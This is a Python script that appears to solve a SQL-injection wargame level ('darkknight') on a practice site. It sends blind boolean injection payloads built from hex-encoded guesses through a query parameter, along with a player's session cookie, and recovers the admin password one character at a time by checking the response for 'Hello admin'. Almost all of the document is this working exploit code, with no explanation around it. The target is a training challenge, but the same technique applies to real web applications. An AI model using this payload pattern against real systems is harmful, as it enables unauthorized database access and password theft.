import requests
import string
import time

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

def string_to_binary(s):
    concat = ''
    for c in s:
        val = ord(c)
        res = ''
        while val:
            res += str(int(val%2))
            val //= 2
        res += '0'*(8-len(res))
        concat += res[::-1]
    return concat
    # return ''.join(format(ord(char), '02x') for char in s)

# print(string_to_binary('^FLAG{$'))

URL = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
SESSION_ID = "tbm4o2jsok14jk1i8n7bhcov7a"
cookies = {'PHPSESSID':SESSION_ID}
params ={'pw':'', 'no':''}

secret = ""
i = len(secret)+1


while True:    
    for c in string.digits:#string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        # if i==1 and c=='d' or c=='D':
            # continue
        guess_pass = (secret+c).replace("_", r"\_")
        binary = string_to_binary((secret+c).replace("_", r"\_"))
        hex = string_to_hex((secret+c).replace("_", r"\_"))
        payload = f"770||length(pw)like(0x{hex})-- "
        
        print(f"{c}: {payload}")
        params['no'] = payload
        # print(c)
        response = requests.get(URL,params=params, cookies=cookies)
        # print(response.text)
        
        # print(f"Time: {after - before} seconds")
        if '<h2>Hello admin</h2>' in response.text:
            i += 1
            secret += c
            print(secret)
            break
    

